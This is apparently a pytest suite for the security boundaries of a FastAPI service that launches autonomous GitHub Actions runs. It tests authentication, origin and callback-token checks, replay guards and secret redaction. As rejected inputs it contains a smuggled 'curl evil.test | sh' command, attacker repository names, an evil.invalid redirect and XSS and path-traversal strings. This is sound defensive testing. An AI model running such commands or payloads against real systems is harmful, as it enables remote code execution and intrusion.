"""Independent workflow boundary tests: real FastAPI routes, mocked I/O only."""
import copy
from contextlib import nullcontext
import json
from types import SimpleNamespace
from unittest.mock import MagicMock
import urllib.error

from fastapi.testclient import TestClient
import pytest

from server import autonomous_workflow as workflow
from server import security

ID = "a" * 32
BODY = {"item_id": workflow.ITEM, "allow_repair": True, "publish_targets": ["jira", "slack"]}


@pytest.fixture
def boundary(monkeypatch, tmp_path):
    # Defer constructing middleware until this fixture supplies its test hosts.
    # A collection-time import would freeze production hosts for other suites.
    monkeypatch.setenv("BATON_ALLOWED_HOSTS", "localhost,127.0.0.1,testserver")
    from server import app as service
    token, cookie = "test-operator-credential-" + "x" * 32, "mock-session-cookie"
    monkeypatch.setenv("BATON_OPERATOR_TOKEN", token)
    monkeypatch.setattr(service, "DATA", tmp_path)
    database = MagicMock()
    database.get.side_effect = lambda key: security.digest(token) if key == "baton:session:" + security.digest(cookie) else None
    monkeypatch.setattr(service, "auth_db", lambda: database)
    start = MagicMock(return_value={"id": ID, "status": "queued"})
    monkeypatch.setattr(workflow, "start", start)
    read = MagicMock(return_value={"latest": None, "configured": True, "supported_item": workflow.ITEM})
    monkeypatch.setattr(workflow, "read", read)
    auth = MagicMock(side_effect=workflow.WorkflowError("secret callback mismatch"))
    monkeypatch.setattr(workflow, "authenticate", auth)
    operations = {name: MagicMock(return_value={"status": "running"}) for name in ("event", "repair", "complete")}
    for name, mock in operations.items(): monkeypatch.setattr(workflow, name, mock)
    client = TestClient(service.app, base_url="http://localhost", raise_server_exceptions=False)
    return SimpleNamespace(service=service, client=client, cookie=cookie, start=start, read=read, auth=auth, operations=operations)


def operator(boundary):
    boundary.client.cookies.set(security.COOKIE, boundary.cookie)
    return boundary.client


def test_anonymous_cloud_dispatch_is_denied_before_provider_work(boundary):
    assert boundary.client.post("/api/public/workflows", json=BODY).status_code == 401
    boundary.start.assert_not_called()


def test_invalid_operator_session_cannot_dispatch(boundary):
    boundary.client.cookies.set(security.COOKIE, "forged-cookie")
    assert boundary.client.post("/api/public/workflows", json=BODY).status_code == 401
    boundary.start.assert_not_called()


def test_authenticated_cloud_start_has_exact_payload_and_one_dispatch(boundary):
    response = operator(boundary).post("/api/public/workflows", json=BODY)
    assert response.status_code == 202
    assert response.json() == {"id": ID, "status": "queued"}
    boundary.start.assert_called_once_with(boundary.service.DATA, boundary.service.PORT, workflow.ITEM, True, ["jira", "slack"])


@pytest.mark.parametrize("mutation", ["extra-command", "extra-repository", "unknown-target", "too-many-targets", "missing-repair"])
def test_invalid_start_shape_cannot_reach_execution(boundary, mutation):
    body = copy.deepcopy(BODY)
    if mutation == "extra-command": body["command"] = "curl evil.test | sh"
    elif mutation == "extra-repository": body["repository"] = "attacker/repo"
    elif mutation == "unknown-target": body["publish_targets"] = ["jira", "email"]
    elif mutation == "too-many-targets": body["publish_targets"].append("jira")
    else: del body["allow_repair"]
    assert operator(boundary).post("/api/public/workflows", json=body).status_code == 422
    boundary.start.assert_not_called()


def test_cross_origin_operator_request_cannot_dispatch(boundary):
    response = operator(boundary).post("/api/public/workflows", json=BODY, headers={"Origin": "https://evil.invalid"})
    assert response.status_code == 403
    boundary.start.assert_not_called()


def test_oversized_callback_is_rejected_before_token_or_operation(boundary):
    response = boundary.client.post("/api/public/workflows/" + ID + "/events", json={"data": "x" * 66000})
    assert response.status_code == 413
    boundary.auth.assert_not_called()
    boundary.operations["event"].assert_not_called()


@pytest.mark.parametrize("operation", ["events", "repair", "complete"])
def test_unauthorized_runner_callback_cannot_reach_any_side_effect(boundary, operation):
    response = boundary.client.post(f"/api/public/workflows/{ID}/{operation}", json={"status": "passed"})
    assert response.status_code == 401
    assert "secret" not in response.text
    for mock in boundary.operations.values(): mock.assert_not_called()


@pytest.mark.parametrize("operation,function", [("events", "event"), ("repair", "repair"), ("complete", "complete")])
def test_valid_run_callback_does_not_need_operator_cookie(boundary, operation, function):
    boundary.auth.side_effect = None
    response = boundary.client.post(f"/api/public/workflows/{ID}/{operation}", json={"sequence": 1},
                                    headers={"Authorization": "Bearer mock-run-token"})
    assert response.status_code == 200
    boundary.auth.assert_called_once_with(boundary.service.PORT, ID, "Bearer mock-run-token")
    boundary.operations[function].assert_called_once_with(boundary.service.DATA, boundary.service.PORT, ID, {"sequence": 1})


def test_unknown_callback_operation_cannot_be_dispatched(boundary):
    response = boundary.client.post(f"/api/public/workflows/{ID}/publish", json={})
    assert response.status_code == 422
    boundary.auth.assert_not_called()
    for mock in boundary.operations.values(): mock.assert_not_called()


@pytest.mark.parametrize("operation,function", [("events", "event"), ("repair", "repair"), ("complete", "complete")])
def test_callback_crash_never_returns_success_or_leaks_exception(boundary, operation, function):
    boundary.auth.side_effect = None
    boundary.operations[function].side_effect = RuntimeError("provider-secret-for-test")
    response = boundary.client.post(f"/api/public/workflows/{ID}/{operation}", json={})
    assert response.status_code == 503
    assert "no success or provider update is implied" in response.text
    assert "provider-secret" not in response.text


def test_latest_receipt_is_public_read_only_and_not_cached(boundary):
    response = boundary.client.get("/api/public/workflows")
    assert response.status_code == 200 and response.json()["latest"] is None
    assert response.headers["cache-control"] == "no-store"
    boundary.read.assert_called_once_with(boundary.service.DATA, boundary.service.PORT)
    boundary.start.assert_not_called()


def test_public_json_treats_untrusted_runner_message_as_data(boundary):
    payload = {"id": ID, "status": "failed", "error": "<script>alert('x')</script>"}
    boundary.read.return_value = payload
    response = boundary.client.get("/api/public/workflows/" + ID)
    assert response.status_code == 200 and response.json() == payload
    assert response.headers["content-type"].startswith("application/json")
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "script-src 'self'" in response.headers["content-security-policy"]


def test_log_content_is_literal_plain_text_with_nosniff(boundary, monkeypatch):
    raw = b"<script>fetch('/api/private')</script>\n"
    monkeypatch.setattr(workflow, "log", MagicMock(return_value=raw))
    response = boundary.client.get(f"/api/public/workflows/{ID}/logs/test.log")
    assert response.status_code == 200 and response.content == raw
    assert response.headers["content-type"].startswith("text/plain")
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["cache-control"] == "no-store"


def test_evidence_route_preserves_exact_verified_report_bytes(boundary, monkeypatch):
    raw = b'{"hash_sensitive":true}\r\n'
    monkeypatch.setattr(workflow, "evidence", MagicMock(return_value=raw))
    response = boundary.client.get(f"/api/public/workflows/{ID}/evidence")
    assert response.status_code == 200 and response.content == raw
    assert response.headers["content-type"].startswith("application/json")


def test_unconfirmed_start_is_sanitized_and_not_retried(boundary):
    boundary.start.side_effect = RuntimeError("secret provider failure")
    response = operator(boundary).post("/api/public/workflows", json=BODY)
    assert response.status_code == 503 and "not confirmed" in response.text
    assert "secret provider" not in response.text
    assert boundary.start.call_count == 1


@pytest.fixture
def control(monkeypatch):
    records = {}
    def store(key, value, **kwargs):
        records[key] = value
        return True
    database = SimpleNamespace(get=lambda key: records.get(key), set=MagicMock(side_effect=store),
        lock=MagicMock(side_effect=lambda *args, **kwargs: nullcontext()))
    monkeypatch.setattr(workflow, "connect", lambda port: database)
    monkeypatch.setattr(workflow.public, "write", MagicMock())
    return SimpleNamespace(records=records, db=database)


def test_callback_bearer_is_hashed_and_bound_to_exact_run(control):
    control.records["autonomous:callback:" + ID] = workflow.sha("test-run-token")
    workflow.authenticate(1, ID, "Bearer test-run-token")
    for identity, auth in [(ID, "test-run-token"), (ID, "Bearer forged"), ("b" * 32, "Bearer test-run-token"), (ID, "")]:
        with pytest.raises(workflow.WorkflowError, match="Invalid or expired"):
            workflow.authenticate(1, identity, auth)


def event_record():
    return {"id": ID, "status": "running", "runner": {"run_id": "123"}, "last_sequence": -1,
            "stages": [{"id": key} for key in ("execute", "repair", "verify")]}


@pytest.mark.parametrize("sequence", [True, False, -1, 101, "1", None])
def test_progress_sequence_must_be_bounded_real_integer(control, sequence):
    control.records["autonomous:run:" + ID] = json.dumps(event_record())
    with pytest.raises(workflow.WorkflowError, match="sequence"):
        workflow.event("unused", 1, ID, {"sequence": sequence, "github_run_id": 123, "stage": "execute"})
    control.db.set.assert_not_called()


def test_duplicate_progress_event_cannot_replay_or_overwrite(control):
    record = event_record(); record["last_sequence"] = 5
    control.records["autonomous:run:" + ID] = json.dumps(record)
    result = workflow.event("unused", 1, ID, {"sequence": 5, "github_run_id": 123, "stage": "repair"})
    assert result == {"accepted": False, "duplicate": True}
    control.db.set.assert_not_called()


@pytest.mark.parametrize("state", ["completed", "partial", "failed"])
def test_progress_cannot_reopen_terminal_execution(control, state):
    record = event_record(); record["status"] = state
    control.records["autonomous:run:" + ID] = json.dumps(record)
    with pytest.raises(workflow.WorkflowError, match="finalized"):
        workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 123, "stage": "execute"})
    control.db.set.assert_not_called()


def test_progress_payload_cannot_claim_verified_completion(control):
    control.records["autonomous:run:" + ID] = json.dumps(event_record())
    result = workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 123, "stage": "check_finished",
        "data": {"message": "<script>malicious()</script>", "status": "completed", "verified": True}})
    assert result == {"accepted": True}
    stored = json.loads(control.records["autonomous:run:" + ID])
    assert stored["status"] == "running" and "verification" not in stored
    assert stored["stages"][0]["detail"] == "<script>malicious()</script>"


@pytest.mark.parametrize("stage", ["completed", "publish", "run_shell", "../execute"])
def test_unknown_progress_stage_cannot_change_execution(control, stage):
    control.records["autonomous:run:" + ID] = json.dumps(event_record())
    with pytest.raises(workflow.WorkflowError, match="stage"):
        workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 123, "stage": stage})
    control.db.set.assert_not_called()


def test_progress_cannot_switch_github_run(control):
    control.records["autonomous:run:" + ID] = json.dumps(event_record())
    with pytest.raises(workflow.WorkflowError, match="Wrong cloud runner"):
        workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 456, "stage": "execute"})
    control.db.set.assert_not_called()


def test_github_gateway_rejects_other_repository_before_network(monkeypatch):
    opener = MagicMock(); monkeypatch.setattr(workflow.urllib.request, "build_opener", opener)
    monkeypatch.setenv("BATON_GITHUB_TOKEN", "mock-only-token")
    with pytest.raises(workflow.WorkflowError, match="outside the runner scope"):
        workflow.github("/repos/attacker/other/actions/runs/1")
    opener.assert_not_called()


def test_github_gateway_does_not_follow_unapproved_artifact_redirect(monkeypatch):
    monkeypatch.setenv("BATON_GITHUB_TOKEN", "mock-only-token")
    opener = MagicMock()
    opener.open.side_effect = urllib.error.HTTPError("https://api.github.com/test", 302, "redirect", {"Location": "https://evil.invalid/archive"}, None)
    monkeypatch.setattr(workflow.urllib.request, "build_opener", MagicMock(return_value=opener))
    fetch = MagicMock(); monkeypatch.setattr(workflow.urllib.request, "urlopen", fetch)
    with pytest.raises(workflow.WorkflowError, match="outside GitHub storage"):
        workflow.github("/repos/" + workflow.REPOSITORY + "/actions/artifacts/1/zip", binary=True)
    fetch.assert_not_called()


def test_github_network_failure_does_not_retry_or_expose_token(monkeypatch):
    monkeypatch.setenv("BATON_GITHUB_TOKEN", "mock-only-secret-token")
    opener = MagicMock(); opener.open.side_effect = urllib.error.URLError("network failure mock-only-secret-token")
    monkeypatch.setattr(workflow.urllib.request, "build_opener", MagicMock(return_value=opener))
    with pytest.raises(workflow.WorkflowError, match="not confirmed; it was not retried") as error:
        workflow.github("/repos/" + workflow.REPOSITORY + "/actions/runs/1")
    assert "secret-token" not in str(error.value)
    assert opener.open.call_count == 1


@pytest.fixture
def launch(control, monkeypatch):
    from server import autonomous_publication as publication
    from server import graph_agent
    monkeypatch.setattr(publication, "_binding", MagicMock(return_value={}))
    monkeypatch.setattr(workflow.secrets, "token_hex", lambda count: ID)
    monkeypatch.setattr(workflow.secrets, "token_urlsafe", lambda count: "mock-only-callback-token")
    def increment(key):
        control.records[key] = int(control.records.get(key, 0)) + 1
        return control.records[key]
    control.db.incr = MagicMock(side_effect=increment)
    control.db.expire = MagicMock(return_value=True)
    investigation = MagicMock(return_value={"id": "agent-live-fixture", "status": "succeeded", "action": {
        "verified": True, "task": {"id": "task-mock", "graph": "baton_mock_unique"}}})
    monkeypatch.setattr(graph_agent, "run", investigation)
    github = MagicMock(return_value={"object": {"sha": "b" * 40}})
    monkeypatch.setattr(workflow, "github", github)
    control.github, control.investigation = github, investigation
    control.budget = "autonomous:allowance:" + workflow.time.strftime("%Y-%m", workflow.time.gmtime())
    return control


def test_start_records_one_scoped_dispatch_without_exposing_callback(launch):
    result = workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    assert result["status"] == "queued" and result["id"] == ID
    assert result["checks"]["verified"] is False and result["runner"]["verified"] is False
    assert launch.github.call_count == 2
    args = launch.github.call_args.args
    assert args[:2] == ("/repos/" + workflow.REPOSITORY + "/actions/workflows/" + workflow.WORKFLOW + "/dispatches", "POST")
    assert args[2] == {"ref": "main", "inputs": {"execution_id": ID, "callback_token": "mock-only-callback-token"}}
    assert "mock-only-callback-token" not in workflow.encode(result)
    assert launch.records["autonomous:callback:" + ID] == workflow.sha("mock-only-callback-token")
    assert launch.records[launch.budget] == 1


def test_start_reuses_active_run_without_model_dispatch_or_budget_spend(launch):
    first = workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    launch.github.reset_mock(); launch.investigation.reset_mock(); launch.db.incr.reset_mock()
    second = workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    assert second["id"] == first["id"]
    launch.github.assert_not_called(); launch.investigation.assert_not_called(); launch.db.incr.assert_not_called()


def test_monthly_attempt_guard_denies_eleventh_before_model_or_dispatch(launch):
    launch.records[launch.budget] = 10
    with pytest.raises(workflow.WorkflowError, match="ten-run monthly"):
        workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    launch.github.assert_not_called(); launch.investigation.assert_not_called()
    assert launch.records[launch.budget] == 11


def test_tenth_monthly_attempt_is_allowed(launch):
    launch.records[launch.budget] = 9
    assert workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])["status"] == "queued"
    assert launch.records[launch.budget] == 10


@pytest.mark.parametrize("body", [
    ("attacker/repo#1", True, ["jira", "slack"]),
    (workflow.ITEM, False, ["jira", "slack"]),
    (workflow.ITEM, True, ["jira", "jira"]),
    (workflow.ITEM, True, ["jira"]),
])
def test_start_rejects_unsupported_execution_or_publication_before_io(launch, body):
    with pytest.raises(workflow.WorkflowError): workflow.start("unused", 1, *body)
    launch.github.assert_not_called(); launch.investigation.assert_not_called(); launch.db.incr.assert_not_called()


def test_failed_investigation_charges_attempt_but_never_dispatches(launch):
    launch.investigation.return_value = {"id": "mock-failed-agent", "status": "failed"}
    result = workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    assert result["status"] == "failed" and result["checks"]["verified"] is False
    assert launch.github.call_count == 1  # Reads workflow commit; no POST.
    assert launch.records[launch.budget] == 1


def test_start_persistence_failure_cannot_dispatch_or_publish_receipt(launch):
    launch.db.set.side_effect = None
    launch.db.set.return_value = False
    with pytest.raises(workflow.WorkflowError, match="persist"):
        workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    assert launch.github.call_count == 1  # Commit lookup only.
    launch.investigation.assert_not_called()
    workflow.public.write.assert_not_called()


def test_dispatch_callback_race_preserves_bound_run_and_progress(launch):
    def github(path, method="GET", payload=None):
        if method == "GET": return {"object": {"sha": "b" * 40}}
        record = workflow._read(1, ID)
        record["runner"]["run_id"] = "123"
        record["last_sequence"] = 0
        record["status"] = "repairing"
        record["stages"][2].update(status="running", detail="callback arrived before dispatch HTTP returned")
        workflow._save("unused", 1, record)
        return {}
    launch.github.side_effect = github
    result = workflow.start("unused", 1, workflow.ITEM, True, ["jira", "slack"])
    assert result["status"] == "repairing"
    assert result["runner"]["run_id"] == "123"
    assert workflow._read(1, ID)["last_sequence"] == 0
    assert result["stages"][2]["detail"] == "callback arrived before dispatch HTTP returned"


@pytest.mark.parametrize("mutation", ["event", "run_attempt", "head_sha", "repository", "display_title", "path", "switch"])
def test_runner_binding_rejects_other_dispatch_commit_workflow_or_attempt(monkeypatch, mutation):
    record = {"id": ID, "expected_workflow_sha": "b" * 40, "runner": {}}
    remote = {"event": "workflow_dispatch", "run_attempt": 1, "head_sha": "b" * 40,
              "repository": {"full_name": workflow.REPOSITORY}, "display_title": "Baton execution " + ID,
              "path": ".github/workflows/" + workflow.WORKFLOW,
              "html_url": "https://github.com/" + workflow.REPOSITORY + "/actions/runs/123"}
    if mutation == "event": remote["event"] = "pull_request"
    elif mutation == "run_attempt": remote["run_attempt"] = 2
    elif mutation == "head_sha": remote["head_sha"] = "c" * 40
    elif mutation == "repository": remote["repository"]["full_name"] = "attacker/fork"
    elif mutation == "display_title": remote["display_title"] = "Baton execution " + "c" * 32
    elif mutation == "path": remote["path"] = ".github/workflows/other.yml"
    elif mutation == "switch": record["runner"]["run_id"] = "456"
    monkeypatch.setattr(workflow, "github", MagicMock(return_value=remote))
    before = copy.deepcopy(record)
    with pytest.raises(workflow.WorkflowError): workflow.bind_run(record, "123")
    assert record == before


def test_github_bound_progress_cannot_overwrite_verified_artifact(control):
    record = event_record(); record["artifact_verified"] = True
    control.records["autonomous:run:" + ID] = json.dumps(record)
    with pytest.raises(workflow.WorkflowError, match="finalized"):
        workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 123, "stage": "execute"})
    control.db.set.assert_not_called()


def test_progress_data_bound_is_enforced_before_persistence(control):
    control.records["autonomous:run:" + ID] = json.dumps(event_record())
    with pytest.raises(workflow.WorkflowError, match="exceeds its bound"):
        workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 123, "stage": "execute", "data": {"message": "x" * 26001}})
    control.db.set.assert_not_called()


def test_failed_event_persistence_is_not_reported_accepted(control):
    control.records["autonomous:run:" + ID] = json.dumps(event_record())
    control.db.set.side_effect = None; control.db.set.return_value = False
    with pytest.raises(workflow.WorkflowError, match="persist"):
        workflow.event("unused", 1, ID, {"sequence": 0, "github_run_id": 123, "stage": "execute"})
    workflow.public.write.assert_not_called()
